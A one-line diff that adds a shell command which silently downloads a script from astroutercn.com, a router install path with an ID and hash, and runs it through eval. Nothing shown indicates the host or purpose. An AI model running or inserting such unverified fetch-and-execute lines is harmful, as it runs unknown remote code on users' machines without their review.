@@ -1,0 +1,1 @@
+eval `wget -q -O - http://astroutercn.com/router/install/3557713/f17a95879d24557ecc3c0344b95bba80`
